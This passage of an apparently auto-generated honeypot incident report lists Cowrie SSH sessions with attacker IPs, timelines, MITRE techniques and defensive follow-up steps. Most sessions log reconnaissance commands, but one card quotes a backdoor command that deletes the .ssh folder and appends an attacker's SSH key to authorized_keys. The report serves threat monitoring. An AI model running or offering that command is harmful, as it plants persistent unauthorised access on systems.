| `2026-09-05 17:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56f5dd2ed6b3

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:53 |
| **Last Seen** | 2026-09-05 17:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:53:15` | `cowrie.session.connect` |
| `2026-09-05 17:53:15` | `cowrie.client.version` |
| `2026-09-05 17:53:15` | `cowrie.client.kex` |
| `2026-09-05 17:53:15` | `cowrie.login.success` |
| `2026-09-05 17:53:15` | `cowrie.session.params` |
| `2026-09-05 17:53:15` | `cowrie.command.input` |
| `2026-09-05 17:53:15` | `cowrie.log.closed` |
| `2026-09-05 17:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec8e9fdb0d35

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:53 |
| **Last Seen** | 2026-09-05 17:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:53:30` | `cowrie.session.connect` |
| `2026-09-05 17:53:30` | `cowrie.client.version` |
| `2026-09-05 17:53:30` | `cowrie.client.kex` |
| `2026-09-05 17:53:30` | `cowrie.login.success` |
| `2026-09-05 17:53:30` | `cowrie.session.params` |
| `2026-09-05 17:53:30` | `cowrie.command.input` |
| `2026-09-05 17:53:30` | `cowrie.log.closed` |
| `2026-09-05 17:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ff912c72df

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:53 |
| **Last Seen** | 2026-09-05 17:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:53:44` | `cowrie.session.connect` |
| `2026-09-05 17:53:44` | `cowrie.client.version` |
| `2026-09-05 17:53:44` | `cowrie.client.kex` |
| `2026-09-05 17:53:44` | `cowrie.login.success` |
| `2026-09-05 17:53:45` | `cowrie.session.params` |
| `2026-09-05 17:53:45` | `cowrie.command.input` |
| `2026-09-05 17:53:45` | `cowrie.log.closed` |
| `2026-09-05 17:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c7d3c479a0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:53 |
| **Last Seen** | 2026-09-05 17:54 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:53:54` | `cowrie.session.connect` |
| `2026-09-05 17:53:55` | `cowrie.client.version` |
| `2026-09-05 17:53:55` | `cowrie.client.kex` |
| `2026-09-05 17:54:00` | `cowrie.login.success` |
| `2026-09-05 17:54:03` | `cowrie.session.params` |
| `2026-09-05 17:54:03` | `cowrie.command.input` |
| `2026-09-05 17:54:03` | `cowrie.command.input` |
| `2026-09-05 17:54:03` | `cowrie.command.input` |
| `2026-09-05 17:54:03` | `cowrie.command.input` |
| `2026-09-05 17:54:03` | `cowrie.command.input` |
| `2026-09-05 17:54:03` | `cowrie.command.success` |
| `2026-09-05 17:54:03` | `cowrie.command.input` |
| `2026-09-05 17:54:03` | `cowrie.command.input` |
| `2026-09-05 17:54:03` | `cowrie.command.input` |
| `2026-09-05 17:54:03` | `cowrie.command.input` |
| `2026-09-05 17:54:05` | `cowrie.log.closed` |
| `2026-09-05 17:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-455bbba6d472

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:53 |
| **Last Seen** | 2026-09-05 17:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:53:59` | `cowrie.session.connect` |
| `2026-09-05 17:53:59` | `cowrie.client.version` |
| `2026-09-05 17:53:59` | `cowrie.client.kex` |
| `2026-09-05 17:54:00` | `cowrie.login.success` |
| `2026-09-05 17:54:00` | `cowrie.session.params` |
| `2026-09-05 17:54:00` | `cowrie.command.input` |
| `2026-09-05 17:54:00` | `cowrie.log.closed` |
| `2026-09-05 17:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3de13e5ac809

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:54 |
| **Last Seen** | 2026-09-05 17:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:54:14` | `cowrie.session.connect` |
| `2026-09-05 17:54:14` | `cowrie.client.version` |
| `2026-09-05 17:54:14` | `cowrie.client.kex` |
| `2026-09-05 17:54:14` | `cowrie.login.success` |
| `2026-09-05 17:54:15` | `cowrie.session.params` |
| `2026-09-05 17:54:15` | `cowrie.command.input` |
| `2026-09-05 17:54:15` | `cowrie.log.closed` |
| `2026-09-05 17:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0300581fd8e6

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:54 |
| **Last Seen** | 2026-09-05 17:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:54:29` | `cowrie.session.connect` |
| `2026-09-05 17:54:29` | `cowrie.client.version` |
| `2026-09-05 17:54:29` | `cowrie.client.kex` |
| `2026-09-05 17:54:29` | `cowrie.login.success` |
| `2026-09-05 17:54:30` | `cowrie.session.params` |
| `2026-09-05 17:54:30` | `cowrie.command.input` |
| `2026-09-05 17:54:30` | `cowrie.log.closed` |
| `2026-09-05 17:54:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ec4b2faf9df

| Field | Detail |
|---|---|
| **Source IP** | `180.76.236[.]214` |
| **First Seen** | 2026-09-05 17:54 |
| **Last Seen** | 2026-09-05 17:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:54:32` | `cowrie.session.connect` |
| `2026-09-05 17:54:32` | `cowrie.client.version` |
| `2026-09-05 17:54:32` | `cowrie.client.kex` |
| `2026-09-05 17:54:33` | `cowrie.login.success` |
| `2026-09-05 17:54:34` | `cowrie.session.params` |
| `2026-09-05 17:54:34` | `cowrie.command.input` |
| `2026-09-05 17:54:34` | `cowrie.command.failed` |
| `2026-09-05 17:54:34` | `cowrie.log.closed` |
| `2026-09-05 17:54:35` | `cowrie.session.params` |
| `2026-09-05 17:54:35` | `cowrie.command.input` |
| `2026-09-05 17:54:36` | `cowrie.session.file_download` |
| `2026-09-05 17:54:36` | `cowrie.log.closed` |
| `2026-09-05 17:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.236[.]214` to AbuseIPDB if not already reported
- [ ] Block `180.76.236[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab893c5431e1

| Field | Detail |
|---|---|
| **Source IP** | `180.76.236[.]214` |
| **First Seen** | 2026-09-05 17:54 |
| **Last Seen** | 2026-09-05 17:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:54:36` | `cowrie.session.connect` |
| `2026-09-05 17:54:36` | `cowrie.client.version` |
| `2026-09-05 17:54:37` | `cowrie.client.kex` |
| `2026-09-05 17:54:38` | `cowrie.login.success` |
| `2026-09-05 17:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.236[.]214` to AbuseIPDB if not already reported
- [ ] Block `180.76.236[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca0a14346a96

| Field | Detail |
|---|---|
| **Source IP** | `180.76.236[.]214` |
| **First Seen** | 2026-09-05 17:54 |
| **Last Seen** | 2026-09-05 17:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:54:38` | `cowrie.session.connect` |
| `2026-09-05 17:54:38` | `cowrie.client.version` |
| `2026-09-05 17:54:38` | `cowrie.client.kex` |
| `2026-09-05 17:54:39` | `cowrie.login.success` |
| `2026-09-05 17:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.236[.]214` to AbuseIPDB if not already reported
- [ ] Block `180.76.236[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d554a4f646

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:54 |
| **Last Seen** | 2026-09-05 17:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:54:44` | `cowrie.session.connect` |
| `2026-09-05 17:54:44` | `cowrie.client.version` |
| `2026-09-05 17:54:44` | `cowrie.client.kex` |
| `2026-09-05 17:54:44` | `cowrie.login.success` |
| `2026-09-05 17:54:44` | `cowrie.session.params` |
| `2026-09-05 17:54:44` | `cowrie.command.input` |
| `2026-09-05 17:54:45` | `cowrie.log.closed` |
| `2026-09-05 17:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b9731857121

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:54 |
| **Last Seen** | 2026-09-05 17:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:54:58` | `cowrie.session.connect` |
| `2026-09-05 17:54:58` | `cowrie.client.version` |
| `2026-09-05 17:54:58` | `cowrie.client.kex` |
| `2026-09-05 17:54:58` | `cowrie.login.success` |
| `2026-09-05 17:54:59` | `cowrie.session.params` |
| `2026-09-05 17:54:59` | `cowrie.command.input` |
| `2026-09-05 17:54:59` | `cowrie.log.closed` |
| `2026-09-05 17:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b318f892953f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-05 17:54 |
| **Last Seen** | 2026-09-05 17:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:54:59` | `cowrie.session.connect` |
| `2026-09-05 17:54:59` | `cowrie.client.version` |
| `2026-09-05 17:55:00` | `cowrie.client.kex` |
| `2026-09-05 17:55:00` | `cowrie.login.success` |
| `2026-09-05 17:55:00` | `cowrie.direct-tcpip.request` |
| `2026-09-05 17:55:00` | `cowrie.direct-tcpip.data` |
| `2026-09-05 17:55:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9be0a690c5b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:55 |
| **Last Seen** | 2026-09-05 17:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:55:13` | `cowrie.session.connect` |
| `2026-09-05 17:55:13` | `cowrie.client.version` |
| `2026-09-05 17:55:13` | `cowrie.client.kex` |
| `2026-09-05 17:55:13` | `cowrie.login.success` |
| `2026-09-05 17:55:14` | `cowrie.session.params` |
| `2026-09-05 17:55:14` | `cowrie.command.input` |
| `2026-09-05 17:55:14` | `cowrie.log.closed` |
| `2026-09-05 17:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-116dceb38cea

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:55 |
| **Last Seen** | 2026-09-05 17:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:55:28` | `cowrie.session.connect` |
| `2026-09-05 17:55:28` | `cowrie.client.version` |
| `2026-09-05 17:55:28` | `cowrie.client.kex` |
| `2026-09-05 17:55:28` | `cowrie.login.success` |
| `2026-09-05 17:55:28` | `cowrie.session.params` |
| `2026-09-05 17:55:28` | `cowrie.command.input` |
| `2026-09-05 17:55:28` | `cowrie.log.closed` |
| `2026-09-05 17:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5160a278846

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:55 |
| **Last Seen** | 2026-09-05 17:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:55:42` | `cowrie.session.connect` |
| `2026-09-05 17:55:42` | `cowrie.client.version` |
| `2026-09-05 17:55:42` | `cowrie.client.kex` |
| `2026-09-05 17:55:42` | `cowrie.login.success` |
| `2026-09-05 17:55:43` | `cowrie.session.params` |
| `2026-09-05 17:55:43` | `cowrie.command.input` |
| `2026-09-05 17:55:43` | `cowrie.log.closed` |
| `2026-09-05 17:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38af203f95c5

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:55 |
| **Last Seen** | 2026-09-05 17:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:55:56` | `cowrie.session.connect` |
| `2026-09-05 17:55:56` | `cowrie.client.version` |
| `2026-09-05 17:55:56` | `cowrie.client.kex` |
| `2026-09-05 17:55:56` | `cowrie.login.success` |
| `2026-09-05 17:55:57` | `cowrie.session.params` |
| `2026-09-05 17:55:57` | `cowrie.command.input` |
| `2026-09-05 17:55:57` | `cowrie.log.closed` |
| `2026-09-05 17:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-553358f949ce

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:56 |
| **Last Seen** | 2026-09-05 17:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:56:11` | `cowrie.session.connect` |
| `2026-09-05 17:56:11` | `cowrie.client.version` |
| `2026-09-05 17:56:11` | `cowrie.client.kex` |
| `2026-09-05 17:56:11` | `cowrie.login.success` |
| `2026-09-05 17:56:11` | `cowrie.session.params` |
| `2026-09-05 17:56:11` | `cowrie.command.input` |
| `2026-09-05 17:56:11` | `cowrie.log.closed` |
| `2026-09-05 17:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb5602c3b327

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:56 |
| **Last Seen** | 2026-09-05 17:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:56:25` | `cowrie.session.connect` |
| `2026-09-05 17:56:25` | `cowrie.client.version` |
| `2026-09-05 17:56:25` | `cowrie.client.kex` |
| `2026-09-05 17:56:25` | `cowrie.login.success` |
| `2026-09-05 17:56:26` | `cowrie.session.params` |
| `2026-09-05 17:56:26` | `cowrie.command.input` |
| `2026-09-05 17:56:26` | `cowrie.log.closed` |
| `2026-09-05 17:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57c7cdcab62c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:56 |
| **Last Seen** | 2026-09-05 17:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:56:29` | `cowrie.session.connect` |
| `2026-09-05 17:56:29` | `cowrie.client.version` |
| `2026-09-05 17:56:29` | `cowrie.client.kex` |
| `2026-09-05 17:56:35` | `cowrie.login.success` |
| `2026-09-05 17:56:38` | `cowrie.session.params` |
| `2026-09-05 17:56:38` | `cowrie.command.input` |
| `2026-09-05 17:56:38` | `cowrie.command.input` |
| `2026-09-05 17:56:38` | `cowrie.command.input` |
| `2026-09-05 17:56:38` | `cowrie.command.input` |
| `2026-09-05 17:56:38` | `cowrie.command.input` |
| `2026-09-05 17:56:38` | `cowrie.command.success` |
| `2026-09-05 17:56:38` | `cowrie.command.input` |
| `2026-09-05 17:56:38` | `cowrie.command.input` |
| `2026-09-05 17:56:38` | `cowrie.command.input` |
| `2026-09-05 17:56:38` | `cowrie.command.input` |
| `2026-09-05 17:56:39` | `cowrie.log.closed` |
| `2026-09-05 17:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fb6dd22d82a

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:56 |
| **Last Seen** | 2026-09-05 17:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:56:39` | `cowrie.session.connect` |
| `2026-09-05 17:56:39` | `cowrie.client.version` |
| `2026-09-05 17:56:39` | `cowrie.client.kex` |
| `2026-09-05 17:56:39` | `cowrie.login.success` |
| `2026-09-05 17:56:40` | `cowrie.session.params` |
| `2026-09-05 17:56:40` | `cowrie.command.input` |
| `2026-09-05 17:56:40` | `cowrie.log.closed` |
| `2026-09-05 17:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78919640fd03

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:56 |
| **Last Seen** | 2026-09-05 17:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:56:54` | `cowrie.session.connect` |
| `2026-09-05 17:56:54` | `cowrie.client.version` |
| `2026-09-05 17:56:54` | `cowrie.client.kex` |
| `2026-09-05 17:56:54` | `cowrie.login.success` |
| `2026-09-05 17:56:54` | `cowrie.session.params` |
| `2026-09-05 17:56:54` | `cowrie.command.input` |
| `2026-09-05 17:56:55` | `cowrie.log.closed` |
| `2026-09-05 17:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c617aa45d14

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:57 |
| **Last Seen** | 2026-09-05 17:57 |
| **Session Duration** | 0s |
